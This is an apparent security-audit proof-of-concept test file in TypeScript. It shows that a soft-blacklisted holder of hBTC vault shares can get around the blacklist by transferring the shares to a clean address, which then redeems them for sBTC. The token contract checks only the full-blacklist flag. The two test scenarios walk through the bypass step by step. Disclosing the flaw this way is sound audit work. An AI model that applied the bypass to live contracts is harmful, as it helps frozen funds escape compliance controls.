// SPDX-License-Identifier: BUSL-1.1
// Copyright (c) 2026 Hermetica Labs, Inc.

/**
 * PoC: Soft-blacklist evasion via direct hBTC token transfer
 *
 * Root cause:
 *   - vault-v1.clar gates deposit / request-redeem / redeem / cancel-redeem
 *     behind `blacklist.check-is-not-soft` (contracts/hbtc/protocol/vault-v1-2.clar)
 *   - token-hbtc.clar's `transfer` only ever calls
 *     `blacklist.check-is-not-full-two` (contracts/hbtc/tokens/token-hbtc.clar:58-61)
 *     -> the SOFT flag is never checked at the token layer, at all.
 *   - `full-blacklist-enabled` in blacklist-v1.clar defaults to `false`
 *     -> even the (wrong) check that IS present is a no-op out of the box.
 *
 * Impact:
 *   A soft-blacklisted address can freely transfer its hBTC shares to any
 *   unblacklisted address and have that address redeem for the underlying
 *   sBTC on its behalf. The soft-blacklist provides no actual protection
 *   against fund exit -- it only blocks the *direct* call path, not the
 *   one-hop-transfer path.
 *
 * This file demonstrates two scenarios:
 *   1. Default config (full-blacklist-enabled = false): trivial bypass.
 *   2. full-blacklist-enabled = true, but address is only soft-blacklisted
 *      (not full): bypass STILL works, proving this isn't a config issue --
 *      the token contract structurally never consults the soft flag.
 *
 * NOTE for reviewers: function/field names below follow the camelCase
 * convention used throughout the existing test suite (Clarigen auto-generates
 * these from the kebab-case Clarity source). If `npm run clarigen` produces
 * slightly different names for the blacklist contract (it hasn't been
 * exercised in the existing suite), adjust call sites accordingly -- the
 * underlying calls/assertions are what matter.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import {
  vault,
  state,
  hbtcToken,
  blacklist,
  hqHbtc,
  deployer,
  manager,
  user1,
  user2,
  ONE_BTC,
  ERR,
  txOk,
  txErr,
  rov,
  initProtocol,
  mineBlocks,
} from '../helpers/setup.js';

beforeEach(() => {
  initProtocol();
});

function advancePastCooldown() {
  mineBlocks(500); // > 3 days in simnet blocks, matches vault.test.ts convention
}

describe('Blacklist Evasion (soft-blacklist bypass via token transfer)', () => {
  it('SCENARIO 1: soft-blacklisted user exits via a clean address, default config', () => {
    const depositAmount = ONE_BTC;

    // --- Setup: deployer (owner) grants itself the blacklister role ---
    txOk(blacklist.setBlacklister(deployer, true), deployer);

    // Sanity: full blacklist enforcement is OFF by default
    expect(rov(blacklist.getFullBlacklistEnabled())).toBe(false);

    // --- user1 deposits normally, receives hBTC shares ---
    const depositResult = txOk(vault.deposit(depositAmount, null), user1);
    const shares = depositResult.value as bigint;
    expect(rov(hbtcToken.getBalance(user1)).value).toBe(shares);

    // --- user1 gets soft-blacklisted (e.g. flagged for compliance review) ---
    txOk(
      blacklist.addBlacklist([{ address: user1, full: false }]),
      deployer,
    );
    expect(rov(blacklist.getSoftBlacklist(user1))).toBe(true);
    expect(rov(blacklist.getFullBlacklist(user1))).toBe(false);

    // --- Confirm the direct path IS blocked, as intended ---
    const directAttempt = txErr(vault.requestRedeem(shares, false), user1);
    expect(directAttempt.value).toBe(ERR.SOFT_BLACKLISTED);

    // --- THE BYPASS: user1 transfers shares to a clean address (user2) ---
    // This should be blocked if soft-blacklist were meaningfully enforced,
    // but token-hbtc.transfer never checks the soft flag.
    const transferResult = txOk(
      hbtcToken.transfer(shares, user1, user2, null),
      user1,
    );
    expect(transferResult.value).toBe(true);
    expect(rov(hbtcToken.getBalance(user1)).value).toBe(0n);
    expect(rov(hbtcToken.getBalance(user2)).value).toBe(shares);

    // --- user2 (clean address) now redeems on user1's behalf ---
    const redeemRequest = txOk(vault.requestRedeem(shares, false), user2);
    const claimId = redeemRequest.value as bigint;

    advancePastCooldown();

    txOk(vault.fundClaim(claimId), manager);
    const finalRedeem = txOk(vault.redeem(claimId), user2);

    // user1's originally-frozen economic value has been fully extracted
    // through user2, despite user1 remaining soft-blacklisted throughout.
    expect(finalRedeem.value as bigint).toBeGreaterThan(0n);
    expect(rov(blacklist.getSoftBlacklist(user1))).toBe(true); // still "blacklisted"
  });

  it('SCENARIO 2: bypass persists even with full-blacklist-enabled = true, for a soft-only address', () => {
    const depositAmount = ONE_BTC;

    txOk(blacklist.setBlacklister(deployer, true), deployer);

    // Explicitly turn ON the enforcement flag that gates token-hbtc.transfer
    txOk(blacklist.setFullBlacklistEnabled(true), deployer);
    expect(rov(blacklist.getFullBlacklistEnabled())).toBe(true);

    const depositResult = txOk(vault.deposit(depositAmount, null), user1);
    const shares = depositResult.value as bigint;

    // user1 is soft-blacklisted ONLY (full: false) -- e.g. under review,
    // not yet confirmed malicious.
    txOk(
      blacklist.addBlacklist([{ address: user1, full: false }]),
      deployer,
    );
    expect(rov(blacklist.getSoftBlacklist(user1))).toBe(true);
    expect(rov(blacklist.getFullBlacklist(user1))).toBe(false);

    // Direct path still correctly blocked
    txErr(vault.requestRedeem(shares, false), user1);

    // Transfer STILL succeeds: check-is-not-full-two only inspects the
    // `full` flag, which is false for user1 -- the `enabled` toggle being
    // on doesn't matter because the wrong flag is being checked entirely.
    const transferResult = txOk(
      hbtcToken.transfer(shares, user1, user2, null),
      user1,
    );
    expect(transferResult.value).toBe(true);
    expect(rov(hbtcToken.getBalance(user2)).value).toBe(shares);

    // Confirms this is a structural gap in token-hbtc.clar, not a
    // misconfiguration of full-blacklist-enabled.
  });
});
